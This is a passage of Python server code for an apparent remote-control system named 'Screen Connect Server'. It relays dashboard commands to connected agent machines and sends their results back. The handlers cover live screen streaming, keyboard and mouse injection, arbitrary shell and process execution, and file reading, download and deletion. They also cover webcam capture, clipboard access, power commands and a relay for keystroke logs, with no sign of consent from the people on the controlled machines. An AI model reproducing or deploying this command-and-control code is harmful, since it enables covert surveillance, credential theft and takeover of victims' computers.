    @sio.on("dashboard_command")
    def on_cmd(data):
        did = data.get("device_id")
        with _dev_lock:
            dev = _devices.get(did)
        if not dev:
            emit("command_error", {"error": f"Device '{did}' not connected."})
            return
        sio.emit("request_action", data, room=did)
        log.info(f"Dashboard command → {did}: tab={data.get('tab')}")

    # ── start_stream — subscribe dashboard AND tell agent to start ─
    @sio.on("start_stream")
    def on_start_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            # Auto-subscribe this dashboard to the stream room
            join_room(f"view:{did}")
            with _view_lock:
                _viewers[did].add(request.sid)
            # Command agent to start streaming
            sio.emit("request_action", {
                "tab":       "monitor",
                "action":    "start",
                "device_id": did,
                "fps":       data.get("fps", 20),
                "quality":   data.get("quality", 55),
                "scale":     data.get("scale", 0.8),
                "mode":      data.get("mode", "video"),
                "monitor":   data.get("monitor", 1),
            }, room=did)
            log.info(f"Stream started: device={did} viewer={request.sid}")

    @sio.on("stop_stream")
    def on_stop_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    @sio.on("set_stream_mode")
    def on_set_stream_mode(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_mode",
                "mode": data.get("mode", "video"), "device_id": did,
            }, room=did)

    @sio.on("set_quality")
    def on_set_quality(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_quality",
                "quality": data.get("quality", 55), "device_id": did,
            }, room=did)

    # ── Dashboard → Agent: screenshot ───────────────────────────
    @sio.on("request_screenshot")
    def on_request_screenshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":       "screenshot",
                "quality":   data.get("quality", 60),
                "scale":     data.get("scale", 0.75),
                "device_id": did,
            }, room=did)

    # ── Dashboard → Agent: mouse ────────────────────────────────
    @sio.on("mouse_event")
    def on_mouse(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "mouse_event", **data}, room=did)

    # ── Dashboard → Agent: scroll ───────────────────────────────
    @sio.on("scroll_event")
    def on_scroll(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "scroll_event", **data}, room=did)

    # ── Dashboard → Agent: keyboard ─────────────────────────────
    @sio.on("key_event")
    def on_key(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "key_event", **data}, room=did)

    # ── Dashboard → Agent: ping ─────────────────────────────────
    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, room=did)

    # ── Dashboard → Agent: disconnect screen ────────────────────
    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    # ── Dashboard → Agent: system monitor ──────────────────────
    @sio.on("start_sysmon")
    def on_start_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "system", "action": "start",
                "interval": data.get("interval", 2), "device_id": did,
            }, room=did)

    @sio.on("stop_sysmon")
    def on_stop_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system", "action": "stop", "device_id": did}, room=did)

    @sio.on("request_snapshot")
    def on_snapshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system_snapshot", "device_id": did}, room=did)

    @sio.on("request_disks")
    def on_disks(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "disks", "device_id": did}, room=did)

    @sio.on("request_network")
    def on_network(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "network", "device_id": did}, room=did)

    # ── Dashboard → Agent: processes ────────────────────────────
    @sio.on("list_processes")
    def on_list_procs(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "processes", "device_id": did}, room=did)

    @sio.on("kill_process")
    def on_kill_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "kill_process", "pid": data.get("pid"), "device_id": did}, room=did)

    @sio.on("start_process")
    def on_start_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "start_process", "command": data.get("command", ""), "device_id": did}, room=did)

    # ── Dashboard → Agent: shell ─────────────────────────────────
    @sio.on("shell_command")
    def on_shell(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":        "shell",
                "command":    data.get("command", "echo hello"),
                "shell_type": data.get("shell_type", "cmd"),
                "device_id":  did,
            }, room=did)

    # ── Dashboard → Agent: file browser ─────────────────────────
    @sio.on("file_list")
    def on_file_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_list", "path": data.get("path", "C:\\"), "device_id": did}, room=did)

    @sio.on("file_read")
    def on_file_read(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_read", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_download")
    def on_file_download(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_download", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_delete")
    def on_file_delete(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_delete", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("list_drives")
    def on_list_drives(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "drives", "device_id": did}, room=did)

    # ── Dashboard → Agent: webcam ─────────────────────────────
    @sio.on("webcam_capture")
    def on_webcam(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam", "camera": data.get("camera", 0), "device_id": did}, room=did)

    @sio.on("webcam_list")
    def on_webcam_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam_list", "device_id": did}, room=did)

    # ── Dashboard → Agent: clipboard ───────────────────────────
    @sio.on("clipboard_get")
    def on_clip_get(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_get", "device_id": did}, room=did)

    @sio.on("clipboard_set")
    def on_clip_set(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_set", "text": data.get("text", ""), "device_id": did}, room=did)

    # ── Dashboard → Agent: power commands ──────────────────────
    @sio.on("power_command")
    def on_power(data):
        did = data.get("device_id", "")
        cmd = data.get("command", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev and cmd in ("lock_screen", "sleep", "shutdown", "restart", "abort_shutdown"):
            sio.emit("request_action", {"tab": cmd, "device_id": did}, room=did)
            log.info(f"Power command '{cmd}' -> {did}")

    # ── Dashboard → Agent: uninstall ────────────────────────────
    @sio.on("uninstall_agent")
    def on_uninstall(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "uninstall", "device_id": did}, room=did)

    # ══════════════════════════════════════════════════════════
    #  Agent → Dashboard relay
    #
    #  THE CORE FIX: Instead of sio.emit(..., skip_sid=agent_sid)
    #  which is broken in gevent single-worker mode, we now emit
    #  to the "view:{device_id}" room (for frames) or "dashboards"
    #  room (for everything else).
    #
    #  Agents never join view: rooms. Dashboards join them on
    #  subscribe_stream / start_stream. This is the correct
    #  room-based relay architecture.
    # ══════════════════════════════════════════════════════════

    @sio.on("screen_data")
    def on_screen_data(data):
        """
        PRIMARY STREAMING RELAY — called every frame from agent.
        Relays ONLY to dashboards viewing this device.
        Tracks frame stats. Sends flow-control ack to agent.
        """
        did = data.get("device_id", "")
        out = dict(data)
        # Normalise: agent sends both 'frame' and 'image', ensure both set
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        if "frame" in out and "image" not in out:
            out["image"] = out["frame"]

        # Frame stats
        frame_bytes = len(out.get("frame", ""))
        now = time.time()
        with _frame_stats_lock:
            _frame_stats[did].append((now, frame_bytes))
        with _dev_lock:
            if did in _devices:
                _devices[did]["frame_count"]   = _devices[did].get("frame_count", 0) + 1
                _devices[did]["last_frame_ts"] = utcnow()

        # Relay to viewer room (dashboards watching this device)
        view_room = f"view:{did}"
        sio.emit("screenshot",   out, room=view_room)
        sio.emit("screen_frame", out, room=view_room)

        # Flow-control ack back to agent (prevents buffer pile-up)
        frame_num = 0
        with _dev_lock:
            frame_num = _devices.get(did, {}).get("frame_count", 0)
        sio.emit("frame_ack", {
            "device_id": did,
            "frame_num": frame_num,
            "ts":        utcnow(),
        }, room=request.sid)

    @sio.on("screenshot_result")
    def on_screenshot_result(data):
        did = data.get("device_id", "")
        out = dict(data)
        if "image" in out and "frame" not in out:
            out["frame"] = out.pop("image")
        if "frame" in out and "image" not in out:
            out["image"] = out["frame"]
        sio.emit("screenshot", out, room=f"view:{did}")
        sio.emit("screenshot_result", out, room="dashboards", skip_sid=request.sid)

    @sio.on("ping_result")
    def on_ping_result(data):
        sio.emit("pong_agent", data, room="dashboards", skip_sid=request.sid)

    @sio.on("cursor_event")
    def on_cursor(data):
        did = data.get("device_id", "")
        # Cursor events only go to viewers of this device
        sio.emit("cursor_event", data, room=f"view:{did}")

    @sio.on("system_stats_report")
    def _r_system(data):
        sio.emit("update_system_tab", data, room="dashboards", skip_sid=request.sid)

    @sio.on("processes_report")
    def _r_procs(data):
        sio.emit("processes_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("kill_result")
    def _r_kill(data):
        sio.emit("kill_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("start_process_result")
    def _r_start_proc(data):
        sio.emit("start_process_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("shell_result")
    def _r_shell(data):
        sio.emit("shell_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("file_list_result")
    def _r_flist(data):
        sio.emit("file_list_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("file_read_result")
    def _r_fread(data):
        sio.emit("file_read_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("file_download_result")
    def _r_fdl(data):
        sio.emit("file_download_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("file_delete_result")
    def _r_fdel(data):
        sio.emit("file_delete_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("drives_report")
    def _r_drives(data):
        sio.emit("drives_report", data, room="dashboards", skip_sid=request.sid)

    @sio.on("disks_report")
    def _r_disks(data):
        sio.emit("disks_report", data, room="dashboards", skip_sid=request.sid)

    @sio.on("network_report")
    def _r_net(data):
        sio.emit("network_report", data, room="dashboards", skip_sid=request.sid)

    @sio.on("webcam_result")
    def _r_webcam(data):
        sio.emit("webcam_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("webcam_list_result")
    def _r_wcam_list(data):
        sio.emit("webcam_list_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("keylog_data")
    def _r_keylog(data):
        sio.emit("keylog_data", data, room="dashboards", skip_sid=request.sid)

    @sio.on("clipboard_data")
    def _r_clip(data):
        sio.emit("clipboard_data", data, room="dashboards", skip_sid=request.sid)

    @sio.on("clipboard_result")
    def _r_clip_result(data):
        sio.emit("clipboard_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("clipboard_set_result")
    def _r_clip_set(data):
        sio.emit("clipboard_set_result", data, room="dashboards", skip_sid=request.sid)

    @sio.on("action_result")
    def _r_action(data):
        sio.emit("action_result", data, room="dashboards", skip_sid=request.sid)

    # ══════════════════════════════════════════════════════════
    #  Watchdog — marks devices offline if heartbeat is silent
    # ══════════════════════════════════════════════════════════
    def _watchdog_loop():
        while True:
            time.sleep(15)
            now = datetime.datetime.utcnow()
            stale = []
            with _dev_lock:
                for did, dev in list(_devices.items()):
                    lb = dev.get("last_beat")
                    if lb:
                        try:
                            last = datetime.datetime.fromisoformat(lb.replace("Z", ""))
                            if (now - last).total_seconds() > HEARTBEAT_TIMEOUT:
                                stale.append(did)
                        except Exception:
                            pass
                for did in stale:
                    label = _devices[did].get("label", did)
                    del _devices[did]
                    log.warning(f"Watchdog: device silent — marking offline: {label} ({did})")
                    db_update(did, {"status": "offline", "disconnected_at": utcnow()})
                    sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
                    sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
            if stale:
                broadcast_device_update()

    sio.start_background_task(_watchdog_loop)

    # ══════════════════════════════════════════════════════════
    #  Render keep-alive self-ping
    #
    #  WHY: Render free tier spins down after 15 min of no HTTP
    #  traffic. When agent is connected, all traffic is WebSocket
    #  — no HTTP hits. After 15 min, next WebSocket upgrade or
    #  HTTP request gets a 502 Bad Gateway.
    #
    #  FIX: Ping our own /health endpoint every 4 minutes via
    #  HTTP to keep the Render instance warm. This is the same
    #  technique used by UptimeRobot and similar services.
    #
    #  Set SELF_PING_INTERVAL=0 env var to disable on paid plans.
    # ══════════════════════════════════════════════════════════
    def _self_ping_loop():
        if SELF_PING_INTERVAL <= 0 or not REQUESTS_OK:
            log.info("Self-ping disabled (SELF_PING_INTERVAL=0 or requests not installed)")
            return
        time.sleep(90)   # wait 90s before first ping (let server fully start)
        render_url = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
        local_url  = f"http://127.0.0.1:{PORT}/health"
        ping_url   = f"{render_url}/health" if render_url else local_url
        log.info(f"Self-ping loop started: {ping_url} every {SELF_PING_INTERVAL}s")
        while True:
            try:
                resp = _requests.get(ping_url, timeout=15)
                log.debug(f"Self-ping: {resp.status_code} {ping_url}")
            except Exception as e:
                log.debug(f"Self-ping failed (harmless if just started): {e}")
            time.sleep(SELF_PING_INTERVAL)

    sio.start_background_task(_self_ping_loop)

# ══════════════════════════════════════════════════════════════
#  Startup banner
# ══════════════════════════════════════════════════════════════
def startup():
    log.info("=" * 65)
    log.info(f"  Screen Connect Server  v{VERSION}")
    log.info("=" * 65)
    local = Path(AGENT_DIR) / AGENT_FILE
    if local.is_file():
        log.info(f"  Agent (local):    {local}  ({local.stat().st_size:,} bytes)")
    else:
        log.info(f"  Agent (local):    not found — using GitHub Releases")
    log.info(f"  Agent (github):   {AGENT_STORAGE_URL}")
    log.info(f"  Supabase:         {SUPABASE_URL[:55]}")
    log.info(f"  SocketIO:         {'yes — gevent' if SOCKETIO_OK else 'NO'}")
    log.info(f"  Port:             {PORT}")
    log.info(f"  Heartbeat ttl:    {HEARTBEAT_TIMEOUT}s")
    log.info(f"  Self-ping:        every {SELF_PING_INTERVAL}s (Render keep-alive)")
    log.info(f"  WS keep-alive:    ping=20s / timeout=60s")
    log.info(f"  Frame relay:      room-based (view:device_id rooms)")
    log.info("=" * 65)
    log.info("  RENDER start command:")
    log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
    log.info("             -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app")
    log.info("  Local dev:")
    log.info("    py -3.12 server.py")
    log.info("=" * 65)

# ══════════════════════════════════════════════════════════════
#  Entry point (local dev only — Render uses gunicorn)
# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    startup()
    if SOCKETIO_OK and sio:
        sio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    else:
        app.run(host="0.0.0.0", port=PORT, debug=False)
